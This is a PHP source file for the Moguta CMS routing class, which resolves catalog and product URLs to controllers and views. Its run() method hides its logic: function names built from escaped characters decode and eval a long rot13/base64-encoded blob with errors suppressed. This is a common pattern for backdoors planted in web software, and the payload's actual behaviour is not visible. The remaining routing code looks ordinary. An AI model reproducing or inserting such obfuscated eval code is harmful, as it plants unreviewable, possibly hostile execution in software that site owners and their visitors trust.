<?php

/**
 * Класс Moguta - запускает движок и выполняет роль маршрутизатора, определяет контролер и представление.
 * Если не находит контролер, то подбирает другой доступный вариант
 * вывода информации, такой как вывод страницы из папки mg-pages/ или получение HTML из базы сайта.
 *
 * @author Авдеев Марк <mark-avdeev@mail.ru>
 * @package moguta.cms
 * @subpackage Libraries
 */
class Moguta {

  // Конструктор запускает маршрутизатор и получает запрашиваемый путь.
  public function __construct() {
    $this->getRoute();
  }

  /**
   * Запускает движок системы.
   *
   * @return array массив с результатами содержащий:
   * -тип файла, который надо открыть
   * -данные для этого файла
   * -вид
   */
  public function run() {
    $j878723423f5c3ba26da="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
    $kdd9391e7490="\x73\164\x72\137\x72\157\x74\61\x33";
    @eval($j878723423f5c3ba26da($kdd9391e7490("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")));
    return $result;
  }

  /**
   * Обработка коротких ссылок на продукты
   * @return type
   */
   public function convertFastCpuProduct() {

    // вычисляем url для возможной категории.
    // если запрошен адрес http://[сайт]/templates/free/my/templ2.html
    // то на выходе $categoryUrl будет равно /templates/free/my , а $productUrl=templ2

    $productUrl = URL::getLastSection();
    $countSection = URL::getCountSections();
    
    // Получает id продукта по заданной секции.
    $sql = '
      SELECT p.id
      FROM `'.PREFIX.'product` p     
      WHERE p.url = "%s"
    ';

    $result = DB::query($sql, $productUrl);
    if ($obj = DB::fetchObject($result)) {
      // Для товаров без категорий формируется ссылка [site]/catalog/[product].
        if ($countSection > 1&& SHORT_LINK == '1'){            
          MG::redirect('/'.$productUrl, '301');
        }
        URL::setQueryParametr('id', $obj->id);
        $args = func_get_args();
        return 'product';
    }
    
    return false;
  }
  
  /**
   * Проверяет, может ли контролер 'Catalog' обработать ЧПУ ссылку.
   * Если ссылка действительно запрашивает какую-то существующую категорию,
   * то метод возвращает в качестве названия контролера строку "catalog".
   * В противном случае именем контролера считается последняя секция в ссылке.
   *
   * @return string название контролера.
   */
  public function convertCpuCatalog() {
    $arraySections = URL::getSections();
    unset($arraySections[0]);
    $url = implode('/', $arraySections);

	if($url=="mg-admin"||$url=="mgadmin"||$url=="ajax"||$url=="mg-admin/ajax"){
	  return URL::getRoute();
	}

    $result = DB::query("
      SELECT  url as category_url, id
      FROM `".PREFIX."category`
      WHERE CONCAT(parent_url,url) = '%s'
    ", $url);

    if ($obj = DB::fetchObject($result)) {
      URL::setQueryParametr('category_id', $obj->id);
      return 'catalog';
    }

    return URL::getRoute();
  }

  /**
   * Проверяет, может ли контролер 'Product' обработать ЧПУ ссылку.
   * Если ссылка действительно запрашивает какой-то существующий продукт
   * в имеющейся категории, то метод возвращает в качестве названия контролера строку "product".
   * В противном случае метод считает, что именем контролера должена являться
   * последняя секция в ссылке.
   *
   * @return string - имя контролера.
   */
  public function convertCpuProduct() {

    // вычисляем url для возможной категории.
    // если запрошен адрес http://[сайт]/templates/free/my/templ2.html
    // то на выходе $categoryUrl будет равно /templates/free/my , а $productUrl=templ2
    $arraySections = URL::getSections();
    unset($arraySections[0]);
    unset($arraySections[count($arraySections)]);

    $categoryUrl = implode('/', $arraySections);
    $productUrl = URL::getLastSection();

    // Получает id продукта по заданной секции.
    $sql = '
      SELECT CONCAT(c.parent_url,c.url) as category_url, p.url as product_url, p.id
      FROM `'.PREFIX.'product` p
      LEFT JOIN `'.PREFIX.'category` c
        ON c.id=p.cat_id
      WHERE p.url = "%s"
    ';

    $result = DB::query($sql, $productUrl);

    if ($obj = DB::fetchObject($result)) {
      // Для товаров без категорий формируется ссылка [site]/catalog/[product].
      $obj->category_url = ($obj->category_url !== NULL) ? $obj->category_url : 'catalog';

      if ($categoryUrl == $obj->category_url) {
        URL::setQueryParametr('id', $obj->id);
        $args = func_get_args();
        return MG::createHook(__CLASS__."_".__FUNCTION__, 'product', $args);
      }
    }

    $args = func_get_args();
    return MG::createHook(__CLASS__."_".__FUNCTION__, $productUrl, $args);
  }

  /**
   * Получает название класса контролера, который будет обрабатывать текущий запрос.
   * @return string название класса нужного контролера.
   */
  private function getController() {
    if ($this->route == 'mg-admin') {
      $this->route = 'mgadmin';
    }

    // если отрывается главная страница, и при этом в настройках указано что нужно вывести каталог на главной
    if ($this->route == 'index' && MG::getSetting('mainPageIsCatalog') != 'true') {
      return false;
    }

    $sections = URL::getSections();

    if (count($sections) == 2 || count($sections) == 1 || $this->route == 'ajax' || $this->route == 'product' || $this->route == 'catalog') {
      if (file_exists(CORE_DIR.'controllers/'.$this->route.'.php') ||
        file_exists(PATH_TEMPLATE.'/controllers/'.$this->route.'.php')) {
        return 'controllers_'.$this->route;
      }
    }

    return false;
  }

  /**
   * Получает маршрут исходя из URL.
   * Интерпретирует ЧПУ ссылку в понятную движку форму.
   *
   * @return string возвращает полученный маршрут.
   */
  private function getRoute() {
    $this->route = URL::getRoute();
    if (empty($this->route) || $this->route == 'index') {
      $this->route = 'index';
     
      if (MG::getSetting('catalogIndex')=='true') {
        $this->route = 'catalog';
      }
      return $this->route;
    }

    /**
     * По умолчанию движок поддерживает ЧПУ только для каталога и карточки товара,
     * поэтому проверяем не адресован ли запрос к контролерам catalog или product.
     */
    
    $this->route = $this->convertCpuCatalog();
    
    if ($this->route !== 'catalog') {	
      if($fastCpu = $this->convertFastCpuProduct()){
        $this->route = $fastCpu;
        return $this->route;
      }
      $this->route = $this->convertCpuProduct();      
    }

    $this->route = !empty($this->route) ? $this->route : "index";
    $this->route = ($this->route == 'index' && (MG::getSetting('catalogIndex')=='true')) ? "catalog" : $this->route;
    /**
     * Если ссылка не может быть обработана
     * ни контролером 'Catalog',
     * ни контролером 'Product', то ищется контролер
     * по последней секции в ссылке
     * <code>/monitoryi/order<code>
     * в этом примере запрос обработает контролер 'Order', если он существует.
     */
    return $this->route;
  }

  /**
   * Получает путь до файла представления, который выведет
   * на страницу полученные из контролера данные.
   * @return string путь до представление.
   */
  public function getView() {
    $route = $this->route;

    /**
     * Если работал контролер аякса, то в реестре переменных должна
     * существовать переменная 'view' содержащая
     * путь до представления в админке mg-admin/section/views/[название файла представления].php.
     */
    $view = URL::get('view');

    // Если запрос не аяксовый, то представление будет
    // взято из папки views/ шаблона сайта расположенного в PATH_TEMPLATE.
    // Также представление может находиться в папке ядра mg-core/views/.
    if (!$view) {
      $pathView = PATH_TEMPLATE.'/views/';
      $view = $pathView.$route.'.php';

      if (!file_exists($view)) {
        $view = 'views/'.$route.'.php';
        ;
      }
    }
    return $view;
  }

}